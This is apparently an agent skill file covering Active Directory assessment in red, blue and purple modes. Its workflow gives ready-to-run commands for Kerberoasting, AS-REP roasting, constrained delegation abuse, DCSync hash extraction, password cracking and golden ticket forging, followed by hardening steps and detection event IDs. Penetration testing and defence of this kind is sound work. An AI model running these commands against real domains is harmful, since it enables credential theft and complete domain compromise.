<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: active-directory-security
description: >-
  Active Directory security assessment, attack path analysis, and hardening
  covering BloodHound enumeration, Kerberoasting, AS-REP roasting, AD CS abuse,
  DCSync attacks, delegation exploitation, golden ticket forging, persistence
  detection, Group Policy auditing, password auditing, NTLM relay attacks, and
  infrastructure hardening. Enables red team AD compromise chains and blue team
  detection and remediation mapped to MITRE ATT&CK.
domain: cybersecurity
subdomain: active-directory-security
tags:
  - active-directory
  - bloodhound
  - kerberoasting
  - as-rep-roasting
  - ad-cs
  - dcsync
  - delegation
  - golden-ticket
  - persistence
  - group-policy
  - password-audit
  - ntlm-relay
  - hardening
  - mitre-attack
version: "1.0"
author: defconxt
license: AGPL-3.0
compatibility: Designed for Claude Code, GitHub Copilot, OpenAI Codex, Cursor, Gemini CLI, and any agentskills.io-compatible agent.
metadata:
  mitre-attack: ["T1558", "T1003", "T1187", "T1649", "T1134", "T1484", "T1556", "T1110"]
  frameworks: ["MITRE ATT&CK", "CIS Benchmarks", "NIST 800-53", "STIGs"]
---

# Active Directory Security

## When to Use

Activate when the operator asks about Active Directory attack paths, Kerberos
exploitation, AD certificate abuse, domain persistence, privilege escalation
within AD forests, Group Policy security, NTLM relay attacks, domain controller
hardening, or AD password auditing.

Mode: `[MODE: RED]` for AD exploitation; `[MODE: BLUE]` for detection and hardening; `[MODE: PURPLE]` for attack-path-to-detection mapping.

## Prerequisites

- Domain-joined system or network access to AD environment
- Impacket suite (`pip install impacket`)
- BloodHound + SharpHound or bloodhound-python collector
- Rubeus (compiled .NET binary for Kerberos attacks)
- Certipy (`pip install certipy-ad`) for AD CS assessment
- CrackMapExec / NetExec (`pip install crackmapexec`)
- Authorized Rules of Engagement covering AD testing scope

## Quick Reference

| Technique | Primary Tools | ATT&CK Tactic |
|-----------|--------------|----------------|
| BloodHound attack paths | BloodHound, SharpHound, bloodhound-python | Discovery (TA0007) |
| Kerberoasting | Impacket GetUserSPNs, Rubeus | Credential Access (TA0006) |
| AS-REP roasting | Impacket GetNPUsers, Rubeus | Credential Access (TA0006) |
| AD CS abuse | Certipy, Certify | Credential Access / Privilege Escalation |
| DCSync | Impacket secretsdump, Mimikatz | Credential Access (TA0006) |
| Delegation abuse | Impacket, Rubeus, krbrelayx | Privilege Escalation (TA0004) |
| Golden ticket | Mimikatz, Impacket ticketer | Persistence (TA0003) |
| Persistence detection | BloodHound, PowerShell, ADRecon | Discovery (TA0007) |
| Group Policy audit | GPOReport, SharpGPOAbuse | Privilege Escalation (TA0004) |
| Password audit | CrackMapExec, DSInternals, hashcat | Credential Access (TA0006) |
| NTLM relay | Impacket ntlmrelayx, Responder | Credential Access (TA0006) |
| AD hardening | PingCastle, Purple Knight, GPO | Defense (multiple) |

## Workflow

### 1. Domain Reconnaissance

Enumerate the AD environment and identify attack surface:

```bash
# Collect BloodHound data with bloodhound-python
bloodhound-python -d corp.local -u jsmith -p 'P@ssw0rd' -ns 10.0.0.1 -c all

# Enumerate domain controllers
crackmapexec smb 10.0.0.0/24 --gen-relay-list targets.txt

# Identify domain trusts
python3 -m impacket.examples.GetADUsers -all -dc-ip 10.0.0.1 corp.local/jsmith:'P@ssw0rd'
```

### 2. Credential Attack Surface

Identify Kerberoastable accounts, AS-REP roastable users, and weak configs:

```bash
# Find Kerberoastable service accounts
impacket-GetUserSPNs -request -dc-ip 10.0.0.1 corp.local/jsmith:'P@ssw0rd'

# Find AS-REP roastable accounts (no preauth)
impacket-GetNPUsers corp.local/ -usersfile users.txt -dc-ip 10.0.0.1 -format hashcat

# Enumerate AD CS templates for ESC vulnerabilities
certipy find -u jsmith@corp.local -p 'P@ssw0rd' -dc-ip 10.0.0.1 -vulnerable
```

### 3. Privilege Escalation Paths

Exploit discovered weaknesses to escalate within the domain:

```bash
# Kerberoast and crack service account hashes
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# Abuse constrained delegation
impacket-getST -spn cifs/dc01.corp.local -impersonate Administrator \
  corp.local/svc-web:'P@ssw0rd' -dc-ip 10.0.0.1

# DCSync to extract domain hashes
impacket-secretsdump -just-dc corp.local/admin:'P@ssw0rd'@10.0.0.1
```

### 4. Domain Persistence

Establish and detect persistent access mechanisms:

```bash
# Forge golden ticket (requires krbtgt hash)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... \
  -domain corp.local Administrator

# Detect AdminSDHolder modifications
node scripts/agent.js detect-persistence --dc 10.0.0.1 --domain corp.local
```

### 5. Hardening and Remediation

Apply defensive controls and validate detection coverage:

```bash
# Run PingCastle health check
PingCastle.exe --healthcheck --server dc01.corp.local

# Audit GPO security settings
node scripts/agent.js audit-gpo --domain corp.local --dc 10.0.0.1

# Validate NTLM relay mitigations
node scripts/agent.js check-relay --targets targets.txt
```

## Verification

- [ ] BloodHound data collected and attack paths identified
- [ ] Kerberoastable and AS-REP roastable accounts enumerated
- [ ] AD CS templates audited for ESC1-ESC8 vulnerabilities
- [ ] Delegation configurations reviewed for abuse potential
- [ ] DCSync permissions audited (Replicating Directory Changes)
- [ ] Group Policy objects reviewed for privilege escalation paths
- [ ] NTLM relay attack surface mapped and mitigations verified
- [ ] Password policy and account hygiene assessed
- [ ] Domain persistence mechanisms detected and documented
- [ ] Hardening recommendations delivered with CIS/STIG mappings

## Detection Opportunities

AD attacks generate telemetry across multiple detection layers:
- Windows Security Event 4769 (Kerberos service ticket — RC4 encryption type 0x17)
- Event 4768 with preauth type 0 for AS-REP roasting
- Event 4662 for DCSync (DS-Replication-Get-Changes extended rights)
- Event 4742 / 5136 for delegation and AdminSDHolder changes
- Certificate enrollment events (AD CS Event 4886/4887)
- NTLM authentication events and SMB signing status
- BloodHound-detectable high-privilege paths as proactive indicators

## References

- [BloodHound](https://github.com/BloodHoundAD/BloodHound) — AD attack path analysis
- [Impacket](https://github.com/fortra/impacket) — Python AD protocol toolkit
- [Rubeus](https://github.com/GhostPack/Rubeus) — Kerberos interaction and abuse
- [Certipy](https://github.com/ly4k/Certipy) — AD Certificate Services exploitation
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) — AD/SMB post-exploitation
- [PingCastle](https://www.pingcastle.com/) — AD security health assessment
- [CIS Microsoft Windows Server Benchmarks](https://www.cisecurity.org/benchmark/microsoft_windows_server)
- [SpecterOps AD Security Research](https://specterops.io/blog/)
